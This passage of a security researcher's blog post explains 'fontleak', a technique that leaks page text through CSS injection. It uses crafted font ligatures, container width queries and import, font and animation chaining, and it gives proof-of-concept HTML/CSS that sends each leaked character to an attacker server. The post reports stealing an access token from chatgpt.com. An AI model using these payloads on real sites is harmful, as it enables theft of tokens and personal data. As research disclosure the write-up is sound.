      <glyph glyph-name="u0" unicode="&#x00FF;" horiz-adv-x="0" d="M1 0z"/>
      <glyph glyph-name="l0" unicode="&#xF0000;" horiz-adv-x="1" d="M128 0z"/>
      <glyph glyph-name="l1" unicode="&#xF0001;" horiz-adv-x="2" d="M129 0z"/>
      <glyph glyph-name="l2" unicode="&#xF0002;" horiz-adv-x="3" d="M130 0z"/>
      <glyph glyph-name="l3" unicode="&#xF0003;" horiz-adv-x="4" d="M131 0z"/>
      <glyph glyph-name="l4" unicode="&#xF0004;" horiz-adv-x="5" d="M132 0z"/>
      <glyph glyph-name="l5" unicode="&#xF0005;" horiz-adv-x="6" d="M133 0z"/>
      <glyph glyph-name="l6" unicode="&#xF0006;" horiz-adv-x="7" d="M134 0z"/>
      <glyph glyph-name="l7" unicode="&#xF0007;" horiz-adv-x="8" d="M135 0z"/>
      <glyph glyph-name="l8" unicode="&#xF0008;" horiz-adv-x="9" d="M136 0z"/>
      <glyph glyph-name="l9" unicode="&#xF0009;" horiz-adv-x="10" d="M137 0z"/>
      <glyph glyph-name="lu" unicode="&#xF000A;" horiz-adv-x="11" d="M10 0z"/>
      <glyph glyph-name="i0" unicode="&#x0100;" horiz-adv-x="0" d="M267 0z"/>
      <glyph glyph-name="i1" unicode="&#x0101;" horiz-adv-x="0" d="M268 0z"/>
      <glyph glyph-name="i2" unicode="&#x0102;" horiz-adv-x="0" d="M269 0z"/>
      <glyph glyph-name="i3" unicode="&#x0103;" horiz-adv-x="0" d="M270 0z"/>
      <glyph glyph-name="i4" unicode="&#x0104;" horiz-adv-x="0" d="M271 0z"/>
      <glyph glyph-name="i5" unicode="&#x0105;" horiz-adv-x="0" d="M272 0z"/>
    </font>
  </defs>
</svg>
```

To make this practical, we can define an alphabet with n characters. Each leaked character at index `i` will have a width of `i + 1` pixels, and we reserve `n + 1` pixels for any character not included in our alphabet. If we're only interested in specific characters, we can ignore unknown glyphs altogether. If we know the prefix of the text we want to leak, we can also define substitutions specifically tailored to that prefix at the start of our `.fea` file.

Then we can use [fonttools](https://github.com/fonttools/fonttools) and [svg2ttf](https://www.npmjs.com/package/svg2ttf) to create the TTF font with our custom substitutions.

# [Modern CSS](https://adragos.ro/fontleak/\#modern-css)

![Screenshot from MDN Web Docs showing CSS container usage](https://adragos.ro/assets/images/posts/container.png)![Screenshot from MDN Web Docs showing CSS container usage](https://adragos.ro/assets/images/posts/container-dark.png)

Screenshot from MDN Web Docs showing CSS container usage

In modern CSS, the `@container` rule lets you write queries similar to how you'd use `@media`, but targeted at elements instead of viewport sizes. For leaking purposes, we're particularly interested in the **width** query. Since our custom font can uniquely identify the width of a specific character in a string, this seems like an ideal match.

However, a `@container` can't measure its own content directly, doing so would lead to this [CSS paradox](https://www.joshwcomeau.com/css/container-queries-introduction/):

Hello world!(font size: 12px)100px@container (width <= 100px){font-size: 16px;}CSSHello world!(font size: 16px)120px@container (width > 100px){font-size: 12px;}CSS

But it can detect width changes caused by other elements! So, instead of applying `@container` directly to the element we want to leak from, we put it on a sibling element. If the parent container has a fixed width, and the sibling element spans 100% of this width, we can indirectly measure the leaked character. Specifically, the width of the `@container` becomes the parent's width minus the leaked character's width.

Given we assume full CSS injection, we can always set up this scenario using `html` (as the parent), `head` (as the sibling element with `@container` tag), and `body` (or any descendant of body, where the content to leak is located). Of course, `head` and `body` roles can be swapped if necessary.

Here's a minimal .html file that leaks the character defined by the ligature defined in `.leak::before`:

```html
<!DOCTYPE html>
<html charset="utf-8">
<head>
  <style>
    * {
      display: none !important;
    }

    html, body, head {
      padding: 0 !important;
      margin: 0 !important;
      width: 0 !important;
      height: 0 !important;
      border: 0 !important;
      outline: 0 !important;
    }

    html {
      display: flex !important;
      width: 12px !important;
      height: 100vh !important;
      container-type: inline-size !important;
      position: relative !important;
    }
    head {
      display: block !important;
      width: 100% !important;
      container-type: size !important;
    }

    body {
      display: block !important;
      width: fit-content !important;
      position: relative !important;
    }
    @font-face {
        font-family: 'myfont';
        src: url('./myfont.otf');
    }
    .leak {
      display: inline-block !important;
      font-family: 'myfont' !important;
      background-color: red !important;
      color: black !important;
      letter-spacing: normal !important;
      font-size: 1000px !important;
      height: 20px !important;
      font-feature-settings: "liga" 1;
      width: fit-content !important;
      overflow: hidden !important;
      white-space: pre !important;
      letter-spacing: 0 !important;
      line-height: 0 !important;
      background-color: red !important;
      font-feature-settings: "salt" 2;
      font-variant-ligatures: contextual;
      color: black;
    }
    .leak::before {
      display: inline !important;
      font-family: 'myfont' !important;
      content: "\100"; /* leak character at index 0 */
    }
    @container (width: 11px) {
      head::before {
        content: url("leak url for character 0");
      }
    }
    /* ... */
    @container (width: 2px) {
      head::before {
        content: url("leak url for character 9");
      }
    }
    @container (width: 1px) {
      head::before {
        content: url("leak url for character u0 (unknown glyph)");
      }
    }
  </style>
</head>
<body>
  <script class="leak">window.secret='The quick brown fox jumps over the lazy dog.';</script>
</body>
</html>
```

# [Dynamic](https://adragos.ro/fontleak/\#dynamic)

Now I'll discuss exfiltration techniques that rely on remote imports when CSP policies are relaxed.

## [Import chaining](https://adragos.ro/fontleak/\#import-chaining)

This technique leverages how Chrome handles imported stylesheets. Instead of waiting for all stylesheets to load before applying them, Chrome evaluates imported CSS files as soon as they are loaded and continuously re-applies styles as subsequent sheets finish downloading. This behavior can be exploited by blocking imports on the server-side, causing Chrome to quickly load the next stylesheet and update the page dynamically.

For Firefox I've found that each @import would require to be in its own `<style>` tag and on Safari this technique didn't seem to work at all.

By controlling the order and timing of these stylesheet imports, it's possible to rapidly and precisely cycle through different ligature substitutions. This makes it a powerful approach for exfiltrating text quickly and reliably from pages.

Let's revisit the 6-digit font that we defined above and see how the attack would look like:

font alphabet0123456789u01234567891011px<html>12px<head> 100% width<body>0px421401codeload initial style with our fontfrom initial styleapply i0 ligature to body::before<html><head> 7px width12px<body> 5pxi0 + 4=\> l4 ligature5px widthand @import("/idx1")blocking@container (width: 7px){head::before {content: leak("i0-4")}}CSSattacker serverfirstcharacter 4release lockfor /idx1load style from /idx1 leak character at idx 1...<html><head> 11px width12px<body> 1pxi5 + 1=\> l1 ligature1px widthrepeat until idx 5leak 6th character is 1, load style for idx6<head> 100% widthi6 + ∅=\> 0 px widthexecution stops here, we have leaked the 421401 code12px

In the diagram above, all characters have 0 width **except** for the `l0-9` and `lu0` which are part of the Unicode Private Use Area (U+F0000–U+FFFFD), so you normally won't see them in text.

## [Font chaining](https://adragos.ro/fontleak/\#font-chaining)

Safari posed a unique challenge since ligatures weren't functioning correctly across `::before` and `::after` pseudo-elements. To overcome this limitation, I developed a font-chaining method. This method uses specially crafted fonts to substitute known unique prefixes with distinct glyphs (`i0`), which allows dynamically chaining additional fonts.

With each subsequent character leaked, the prefix grows, and new fonts are generated to handle the updated prefix. This way, Safari can effectively leak content character-by-character through dynamically linked fonts, despite its limitations with ligatures. The fonts are cycled by an animation that changes the current font.

The idea is similar to Sequential Import Chaining, but instead of loading new stylesheets, we load new fonts that are generated each time with a custom prefix. I think the AAT state machine would help here, to preload all the fonts instead of dynamically loading them, but that is an area for further research. (the reason that this can't be done with GSUB is that `substitute i2 @any @any by i0` will actually create `|@any|^2` substitutions in the GSUB table! I wish the lookups would be more compressed).

Let's assume that we know that our 6 digit code is after the `:` character, and no other `:` character is present in the text:

font alphabet0123456789u01234567891011px<html>12px<head> 100% width<body>0px"Your code is:421401"load initial style with font0 -> substitute : by i0: gets substituted by i0<html><head> 7px width12px<body> 5pxi0 + 4=\> l4 ligature5px width@container (width: 7px){head::before {content: leak("i0-4")}}CSSattacker serverfirstcharacter 40:generate font1 -> substitute :4 by i0...we don't care about leaking this characterwe just define it so we can substitute itload font1 and apply it to text

# [Static](https://adragos.ro/fontleak/\#static)

Not all scenarios allow dynamic imports, but static methods can still achieve reliable exfiltration. In cases where CSP prevents stylesheet imports but allows fonts and images, a simple server under attacker control can be used to deliver the custom fonts and leak the characters via images.

Font chaining works great for Safari if fonts are permitted by CSP; otherwise, this static method remains reliable for Chrome and Firefox by leveraging carefully crafted static CSS and fonts hosted externally where CSP allows.

## [CSS Animations](https://adragos.ro/fontleak/\#css-animations)

CSS animations offer another powerful way to cycle through ligatures without dynamic stylesheet imports. By using animations to repeatedly update the content of pseudo-elements, we can cycle through different ligatures to systematically leak characters.

This method requires multiple CSS rules and an animation that cycles through the index ligature, but browser-specific optimizations can significantly enhance efficiency. For instance, Firefox allows caching tricks using specific HTTP headers to trigger repeated requests, while Chrome supports scroll-container tricks (though not yet implemented in Fontleak) for even faster and more reliable exfiltration.

Okay so I kinda used CSS animations in the sequential font chaining payload for Safari, but didn't talk much about it. So in CSS you can define animations, which is some CSS style that is only evaluated at the given keyframe. Why is that important? Because we can define the `content` property of pseudo-elements to be a counter (in our case the `in` representing the index that we want to leak) that increments with each animation frame. Here's a very basic counter implemented in only CSS + HTML:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Counting Animation</title>
    <style>
        h1 {
            font-size: 3rem;
            text-align: center;
            margin-top: 20vh;
        }
        h1::after {
            animation: count 3s infinite;
            content: "";
        }
        @keyframes count {
            0% { content: "1"; }
            33% { content: "2"; }
            66% { content: "3"; }
            100% { content: "1"; }
        }
    </style>
</head>
<body>
    <h1>Counter:</h1>
</body>
</html>
```

And here's how that looks like:

Counting Animation

# Counter:

So we don't _need_ a remote server to increment the index, it just makes the payload smaller and more reliable. CSS Animations render based on the frame rate of the device, so there is an upper bound on how fast we can reliably increment the index without losing data.

Here's what the attack looks like, with keyframes given in increments of 10% (which allows to leak 11 characters instead of 6):

font alphabet0123456789u01234567891011px<html>12px<head> 100% width<body>0px421401codeload initial style with our fontkeyframe 0%body::before content set to i0<html><head> 7px width12px<body> 5pxi0 + 4=\> l4 ligature5px widthand CSS animation@container (width: 7px){head::before {content: leak("i0-4")}}CSSattacker serverfirstcharacter 4...<html><head> 11px width12px<body> 1pxi5 + 1=\> l1 ligature1px widthrepeat until keyframe 50%leak 6th (idx 5) character is 1, keyframe 60%<head> 100% widthi6 + ∅=\> 0 px widthCSS animation finishes, (it also can cycle back to 0%)we have leaked the 421401 code12pxkeyframe 10%body::before content set to i1keyframe 60% - 100%request to attacker server

# [Use case: exfiltrating PII and Access Token from chatgpt.com](https://adragos.ro/fontleak/\#use-case-exfiltrating-pii-and-access-token-from-chatgptcom)

Exfiltrating 2400 characters in 7 minutes. Reason that it gets slower as it goes on is because more chained substitutions were required and the inline script was very long.

ChatGPT Fontleak access token - YouTube

[Photo image of adragos](https://www.youtube.com/channel/UCTfE4804mc2dsaeoVgw2c5w?embeds_referring_euri=https%3A%2F%2Fadragos.ro%2F)

adragos

972 subscribers

[ChatGPT Fontleak access token](https://www.youtube.com/watch?v=eaBK6IvkvGc)

adragos

Search

Watch later

Share

Copy link

Info

Shopping

Tap to unmute

If playback doesn't begin shortly, try restarting your device.

More videos

## More videos

You're signed out

Videos you watch may be added to the TV's watch history and influence TV recommendations. To avoid this, cancel and sign in to YouTube on your computer.

CancelConfirm

Share

Include playlist

An error occurred while retrieving sharing information. Please try again later.

[Watch on](https://www.youtube.com/watch?v=eaBK6IvkvGc&embeds_referring_euri=https%3A%2F%2Fadragos.ro%2F)

0:00

0:00 / 7:27

•Live

•

This is the CSP that allowed the exfiltration to happen:

![](https://adragos.ro/assets/images/posts/20250421150321.png)

As you can see, no @import was allowed but the static version of fontleak was able to do the job.

# [Conclusion](https://adragos.ro/fontleak/\#conclusion)

The source code is available on GitHub, contributions are always welcome! There's plenty more to discover and refine in CSS and font-based exfiltration (especially using Graphite and Apple Advanced Typography), and I'm excited to see what others might uncover next. I'm happy that I've managed to have fontleak exfiltrate 1k characters in under a minute.

I've also only worked on exfiltrating latin characters, so extending fontleak to other alphabets (like Cyrillic or Greek) would be a great next step.

**Note:** This is a Proof of Concept, so please take that into account.

[Twitter](https://twitter.com/adragos_) [GitHub](https://github.com/adrgs) [LinkedIn](https://www.linkedin.com/in/dragosalbastroiu/)
